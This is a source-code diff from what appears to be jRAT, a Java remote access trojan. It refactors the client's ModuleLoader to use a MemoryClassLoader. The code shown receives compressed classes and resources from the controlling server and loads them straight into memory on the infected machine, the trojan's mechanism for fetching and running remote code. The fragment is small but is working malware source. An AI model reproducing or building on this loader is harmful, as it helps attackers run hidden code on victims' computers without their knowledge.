@@ -2,8 +2,7 @@ package jrat.client.modules;
 
 import jrat.api.Module;
 import jrat.client.Connection;
-import jrat.client.Injector;
-import jrat.client.InjectorClassloader;
+import jrat.client.MemoryClassLoader;
 import jrat.client.Main;
 import jrat.common.compress.QuickLZ;
 
@@ -24,7 +23,7 @@ public class ModuleLoader {
             String mainClass = c.readLine();
             Main.debug("receiving module " + mainClass);
 
-            InjectorClassloader l = new InjectorClassloader(ModuleLoader.class.getClassLoader(), null);
+            MemoryClassLoader l = new MemoryClassLoader(ModuleLoader.class.getClassLoader(), null);
 
             // read all classes and resources from the server
             while (c.readBoolean()) {
@@ -38,9 +37,9 @@ public class ModuleLoader {
                 buffer =  QuickLZ.decompress(buffer);
 
                 if (clazz) {
-                    l.classes.put(Injector.getClassName(name), buffer);
+                    l.addClass(name, buffer);
                 } else {
-                    l.others.put(name, buffer);
+                    l.addResource(name, buffer);
                 }
 
                 Main.debug("\tclass " + name + " (" + classLen + " b)");
